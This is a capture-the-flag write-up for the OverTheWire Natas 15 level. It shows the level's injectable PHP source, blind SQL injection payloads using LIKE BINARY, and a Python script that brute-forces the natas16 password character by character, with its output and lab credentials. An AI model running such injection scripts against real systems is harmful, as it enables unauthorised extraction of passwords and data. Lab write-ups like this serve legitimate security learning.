# Natas Level 14 → Level 15 Blind SQL Injection

## Previous Flag
<b>SdqIqBsFcz3yotlNYErZSZwblkm0lrvx</b>

## Goal
Username: natas15<br>
URL: http://natas15.natas.labs.overthewire.org<br>

Username: <br>
Check existence

## What I learned
```
length of password 32
username natas16

Table: users
+-----------+----------------------------+
| username  | password                   |
+-----------+----------------------------+
| natas16   | <censored password base64> |
| hacker    | tryhackme                  |
+-----------+----------------------------+

%       matches any sequence of characters ❤️
_       matches a single character

LIKE is case-insensitive (MySQL default)        LIKE BINARY (case-sensitive matching)
LIKE 'abc%'                                     LIKE BINARY 'abc%'
```

## Solution
```
Click View source code
http://natas15.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 👀
    if(array_key_exists("debug", $_GET)) { 👀
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

# Manual Brute Force (To long)
Username: natas16" AND password LIKE BINARY "h% ⌨️
    This user exists.
Username: natas16" AND password LIKE BINARY "hP% ⌨️
    This user exists.

# Brute Force (/scripts/blindsqlinjection.py)
import requests
import re

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

url = "http://natas15.natas.labs.overthewire.org"

session = requests.Session()
current_password = list()

# password the column we trying find w/ user natas16 using LIKE to search
while(True):
 for character in characters:
     print("Trying with: " + "".join(current_password) + character)
     response = session.post(url, data={"username": 'natas16" AND password LIKE BINARY "' + "".join(current_password) + character + '%" #'},auth=(username, password))
     if "This user exists." in response.text:
      current_password.append(character)
      break
 if len(current_password) == 32:
  break

@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 ./scripts/blindsqlinjection.py ⌨️❤️
Trying with: hPkjKYviLQctEW33QmuXL6eDVfMW4sGl
Trying with: hPkjKYviLQctEW33QmuXL6eDVfMW4sGm
Trying with: hPkjKYviLQctEW33QmuXL6eDVfMW4sGn
Trying with: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo 🔐

@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 ./scripts/blindsqlinjection2.py ⌨️❤️
Found one more char : h
Found one more char : hP
Found one more char : hPk
Found one more char : hPkj
Found one more char : hPkjK
Found one more char : hPkjKY
Found one more char : hPkjKYv
Found one more char : hPkjKYvi
Found one more char : hPkjKYviL
Found one more char : hPkjKYviLQ
Found one more char : hPkjKYviLQc
Found one more char : hPkjKYviLQct
Found one more char : hPkjKYviLQctE
Found one more char : hPkjKYviLQctEW
Found one more char : hPkjKYviLQctEW3
Found one more char : hPkjKYviLQctEW33
Found one more char : hPkjKYviLQctEW33Q
Found one more char : hPkjKYviLQctEW33Qm
Found one more char : hPkjKYviLQctEW33Qmu
Found one more char : hPkjKYviLQctEW33QmuX
Found one more char : hPkjKYviLQctEW33QmuXL
Found one more char : hPkjKYviLQctEW33QmuXL6
Found one more char : hPkjKYviLQctEW33QmuXL6e
Found one more char : hPkjKYviLQctEW33QmuXL6eD
Found one more char : hPkjKYviLQctEW33QmuXL6eDV
Found one more char : hPkjKYviLQctEW33QmuXL6eDVf
Found one more char : hPkjKYviLQctEW33QmuXL6eDVfM
Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW
Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW4
Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW4s
Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW4sG
Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW4sGo 🔐
```

## Flag
<b>hPkjKYviLQctEW33QmuXL6eDVfMW4sGo</b>

## Continue
[Continue](/overthewire/Natas1516.md)